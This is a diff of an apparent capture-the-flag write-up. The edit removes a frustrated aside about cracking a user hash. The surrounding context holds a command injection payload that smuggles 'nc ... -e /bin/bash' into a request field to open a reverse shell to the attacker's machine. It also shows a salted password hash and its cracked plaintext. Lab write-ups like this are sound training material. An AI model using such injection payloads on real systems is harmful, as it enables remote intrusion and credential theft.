@@ -89,7 +89,7 @@ delim=comma%3b+nc+10.10.14.209+1234+-e+/bin/bash --- inside burp request
 Played around the server and with the help of SQL creds we got the user hash... Unfortunately, I feel it will pe kinda hard for us to crack it.. : 
 *  \$1\$🧂llol$DQpmdvnb7EeuO6UaqRItf. 
 
-One thing which induced me in error was the salt emoji... I thought it was some kind of indication that the "llol$" part is actually just salt and I wasted some time with hashcat on this.. I'm not good enough yet it seems... FUCK!!!! Anyhow, we cracked the password : ilovecody112235! (after 10 mins)
+One thing which induced me in error was the salt emoji... I thought it was some kind of indication that the "llol$" part is actually just salt and I wasted some time with hashcat on this.. Anyhow, we cracked the password : ilovecody112235! (after 10 mins)
 
 
 ## 3. Privesc
